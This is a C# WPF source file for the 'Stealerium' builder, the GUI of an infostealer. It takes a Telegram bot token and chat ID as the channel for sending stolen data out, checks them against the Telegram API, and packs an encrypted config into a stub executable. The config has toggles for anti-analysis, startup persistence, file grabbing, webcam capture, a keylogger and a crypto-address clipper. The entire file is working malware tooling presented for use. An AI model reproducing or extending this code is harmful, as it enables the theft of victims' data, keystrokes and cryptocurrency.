using System.IO;
using System.Net.Http;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using System.Windows.Media;
using Wpf.Ui.Controls;

namespace Stealerium.Builder
{
    public partial class MainWindow
    {
        private string stubPath = string.Empty;
        private bool isStubDetected = false;
        private bool isApiTokenValid = false;
        private bool isChatIdValid = false;

        public MainWindow()
        {
            InitializeComponent();
            CheckStubFile();
            InitializeUI();
        }

        private void InitializeUI()
        {
            // Set initial states
            WebhookStatusLabel.IsOpen = false;
            ApiTokenTextBox.PlaceholderText = "Enter your Telegram bot API token";
            ChatIdTextBox.PlaceholderText = "Enter your Telegram chat ID";

            // Set tooltips for better UX
            DebugCheckBox.ToolTip = "Enable detailed error logging to a file";
            AntiAnalysisCheckBox.ToolTip = "Implement anti-analysis measures";
            StartDelayCheckBox.ToolTip = "Add random delay on startup";
            GrabberCheckBox.ToolTip = "Enable file grabbing functionality";
            StartupCheckBox.ToolTip = "Install the application to run on system startup";
            
            // Set initial button states
            TestTelegramButton.IsEnabled = false;
            BuildButton.IsEnabled = false;

            // Initialize advanced options as disabled
            WebcamScreenshotCheckBox.IsEnabled = false;
            KeyloggerCheckBox.IsEnabled = false;
            ClipperCheckBox.IsEnabled = false;
        }

        private void CheckStubFile()
        {
            stubPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stub", "stub.exe");

            if (File.Exists(stubPath))
            {
                StubStatusLabel.Title = "Stub Status";
                StubStatusLabel.Message = "Stub detected successfully";
                StubStatusLabel.Severity = InfoBarSeverity.Success;
                StubStatusLabel.IsOpen = true;
                StubStatusLabel.IsClosable = false;
                isStubDetected = true;
            }
            else
            {
                StubStatusLabel.Title = "Stub Status";
                StubStatusLabel.Message = "Stub not found! Please place stub.exe in the 'Stub' folder.";
                StubStatusLabel.Severity = InfoBarSeverity.Error;
                StubStatusLabel.IsOpen = true;
                StubStatusLabel.IsClosable = false;
                isStubDetected = false;
            }

            UpdateBuildButtonState();
        }

        private void UpdateBuildButtonState()
        {
            BuildButton.IsEnabled = isStubDetected && isApiTokenValid && isChatIdValid;
            BuildButton.Appearance = BuildButton.IsEnabled ? Wpf.Ui.Controls.ControlAppearance.Success : Wpf.Ui.Controls.ControlAppearance.Secondary;
        }

        private async void ApiTokenTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            var token = ApiTokenTextBox.Text.Trim();
            TestTelegramButton.IsEnabled = !string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(ChatIdTextBox.Text.Trim());

            if (string.IsNullOrEmpty(token))
            {
                isApiTokenValid = false;
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Telegram API token cannot be empty";
                WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
                WebhookStatusLabel.IsOpen = true;
                UpdateBuildButtonState();
                return;
            }

            LoadingOverlay.Visibility = Visibility.Visible;
            isApiTokenValid = await Telegram.TokenIsValidAsync(token);
            
            if (isApiTokenValid)
            {
                WebhookStatusLabel.Title = "Validation Success";
                WebhookStatusLabel.Message = "Telegram API token is valid";
                WebhookStatusLabel.Severity = InfoBarSeverity.Success;
            }
            else
            {
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Invalid Telegram API token";
                WebhookStatusLabel.Severity = InfoBarSeverity.Error;
            }
            
            WebhookStatusLabel.IsOpen = true;
            LoadingOverlay.Visibility = Visibility.Collapsed;
            UpdateBuildButtonState();
        }

        private async void ChatIdTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            var token = ApiTokenTextBox.Text.Trim();
            var chatId = ChatIdTextBox.Text.Trim();
            TestTelegramButton.IsEnabled = !string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(chatId);

            if (string.IsNullOrEmpty(chatId))
            {
                isChatIdValid = false;
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Telegram chat ID cannot be empty";
                WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
                WebhookStatusLabel.IsOpen = true;
                UpdateBuildButtonState();
                return;
            }

            if (string.IsNullOrEmpty(token))
            {
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Please enter a Telegram API token first";
                WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
                WebhookStatusLabel.IsOpen = true;
                return;
            }

            LoadingOverlay.Visibility = Visibility.Visible;
            isChatIdValid = await ValidateChatIdAsync(token, chatId);
            
            if (isChatIdValid)
            {
                WebhookStatusLabel.Title = "Validation Success";
                WebhookStatusLabel.Message = "Telegram chat ID is valid";
                WebhookStatusLabel.Severity = InfoBarSeverity.Success;
            }
            else
            {
                WebhookStatusLabel.Title = "Validation Error";
                WebhookStatusLabel.Message = "Invalid Telegram chat ID";
                WebhookStatusLabel.Severity = InfoBarSeverity.Error;
            }
            
            WebhookStatusLabel.IsOpen = true;
            LoadingOverlay.Visibility = Visibility.Collapsed;
            UpdateBuildButtonState();
        }

        private async Task<bool> ValidateChatIdAsync(string token, string chatId)
        {
            try
            {
                string testMessage = "Validating chat ID...";
                string telegramApiUrl = $"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(testMessage)}";

                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage response = await client.GetAsync(telegramApiUrl);
                    return response.IsSuccessStatusCode;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        private async void TestTelegramButton_Click(object sender, RoutedEventArgs e)
        {
            var token = ApiTokenTextBox.Text.Trim();
            var chatId = ChatIdTextBox.Text.Trim();

            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId))
            {
                var messageBox = new Wpf.Ui.Controls.MessageBox
                {
                    Title = "Validation Error",
                    Content = "Please enter both Telegram API token and chat ID."
                };
                await messageBox.ShowDialogAsync();
                return;
            }

            TestTelegramButton.IsEnabled = false;
            LoadingOverlay.Visibility = Visibility.Visible;

            bool isTokenValid = await Telegram.TokenIsValidAsync(token);
            if (!isTokenValid)
            {
                WebhookStatusLabel.Title = "Connection Error";
                WebhookStatusLabel.Message = "Invalid Telegram API token";
                WebhookStatusLabel.Severity = InfoBarSeverity.Error;
                WebhookStatusLabel.IsOpen = true;
            }
            else
            {
                int messageId = await Telegram.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token, chatId);
                if (messageId > 0)
                {
                    WebhookStatusLabel.Title = "Connection Success";
                    WebhookStatusLabel.Message = "Connected to Telegram successfully!";
                    WebhookStatusLabel.Severity = InfoBarSeverity.Success;
                }
                else
                {
                    WebhookStatusLabel.Title = "Connection Error";
                    WebhookStatusLabel.Message = "Failed to send test message";
                    WebhookStatusLabel.Severity = InfoBarSeverity.Error;
                }
            }

            LoadingOverlay.Visibility = Visibility.Collapsed;
            TestTelegramButton.IsEnabled = true;
            UpdateBuildButtonState();
        }

        private void StartupCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            WebcamScreenshotCheckBox.IsEnabled = true;
            KeyloggerCheckBox.IsEnabled = true;
            ClipperCheckBox.IsEnabled = true;
        }

        private void StartupCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            WebcamScreenshotCheckBox.IsEnabled = false;
            WebcamScreenshotCheckBox.IsChecked = false;
            KeyloggerCheckBox.IsEnabled = false;
            KeyloggerCheckBox.IsChecked = false;
            ClipperCheckBox.IsEnabled = false;
            ClipperCheckBox.IsChecked = false;
        }

        private void ClipperCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            ClipperAddressesPanel.Visibility = Visibility.Visible;
        }

        private void ClipperCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            ClipperAddressesPanel.Visibility = Visibility.Collapsed;
            ClipperBTCTextBox.Text = string.Empty;
            ClipperETHTextBox.Text = string.Empty;
            ClipperLTCTextBox.Text = string.Empty;
        }

        private async void BuildButton_Click(object sender, RoutedEventArgs e)
        {
            await BuildStub();
        }

        private async Task BuildStub()
        {
            var token = ApiTokenTextBox.Text.Trim();
            var chatId = ChatIdTextBox.Text.Trim();

            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId))
            {
                var messageBox = new Wpf.Ui.Controls.MessageBox
                {
                    Title = "Build Error",
                    Content = "Please enter both Telegram API token and chat ID."
                };
                await messageBox.ShowDialogAsync();
                return;
            }

            // Set configuration values for build
            Build.ConfigValues["TelegramAPI"] = Crypt.EncryptConfig(token);
            Build.ConfigValues["TelegramID"] = Crypt.EncryptConfig(chatId);
            Build.ConfigValues["Debug"] = DebugCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["AntiAnalysis"] = AntiAnalysisCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["Startup"] = StartupCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["StartDelay"] = StartDelayCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["Grabber"] = GrabberCheckBox.IsChecked == true ? "1" : "0";

            if (Build.ConfigValues["Startup"] == "1")
            {
                Build.ConfigValues["WebcamScreenshot"] = WebcamScreenshotCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Keylogger"] = KeyloggerCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Clipper"] = ClipperCheckBox.IsChecked == true ? "1" : "0";
            }
            else
            {
                Build.ConfigValues["WebcamScreenshot"] = "0";
                Build.ConfigValues["Keylogger"] = "0";
                Build.ConfigValues["Clipper"] = "0";
            }

            if (Build.ConfigValues["Clipper"] == "1")
            {
                if (string.IsNullOrWhiteSpace(ClipperBTCTextBox.Text) && 
                    string.IsNullOrWhiteSpace(ClipperETHTextBox.Text) && 
                    string.IsNullOrWhiteSpace(ClipperLTCTextBox.Text))
                {
                    var messageBox = new Wpf.Ui.Controls.MessageBox
                    {
                        Title = "Build Error",
                        Content = "Please enter at least one cryptocurrency address for the clipper."
                    };
                    await messageBox.ShowDialogAsync();
                    return;
                }

                Build.ConfigValues["ClipperBTC"] = Crypt.EncryptConfig(ClipperBTCTextBox.Text.Trim());
                Build.ConfigValues["ClipperETH"] = Crypt.EncryptConfig(ClipperETHTextBox.Text.Trim());
                Build.ConfigValues["ClipperLTC"] = Crypt.EncryptConfig(ClipperLTCTextBox.Text.Trim());
            }
            else
            {
                Build.ConfigValues["ClipperBTC"] = "";
                Build.ConfigValues["ClipperETH"] = "";
                Build.ConfigValues["ClipperLTC"] = "";
            }

            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Title = "Save Built Stub",
                Filter = "Executable Files (*.exe)|*.exe",
                FileName = "build.exe"
            };

            if (saveFileDialog.ShowDialog() == true)
            {
                try
                {
                    LoadingOverlay.Visibility = Visibility.Visible;
                    var buildPath = Build.BuildStub(saveFileDialog.FileName, stubPath);
                    BuildStatusLabel.Text = $"Build successful: {buildPath}";
                    BuildStatusLabel.Foreground = new SolidColorBrush(Colors.Green);
                    
                    var messageBox = new Wpf.Ui.Controls.MessageBox
                    {
                        Title = "Build Success",
                        Content = $"Stub built successfully and saved to:\n{buildPath}"
                    };
                    await messageBox.ShowDialogAsync();
                }
                catch (Exception ex)
                {
                    BuildStatusLabel.Text = $"Build failed: {ex.Message}";
                    BuildStatusLabel.Foreground = new SolidColorBrush(Colors.Red);
                    
                    var messageBox = new Wpf.Ui.Controls.MessageBox
                    {
                        Title = "Build Error",
                        Content = $"Failed to build stub:\n{ex.Message}"
                    };
                    await messageBox.ShowDialogAsync();
                }
                finally
                {
                    LoadingOverlay.Visibility = Visibility.Collapsed;
                }
            }
            else
            {
                BuildStatusLabel.Text = "Build cancelled";
                BuildStatusLabel.Foreground = new SolidColorBrush(Colors.Gray);
            }
        }
    }
}
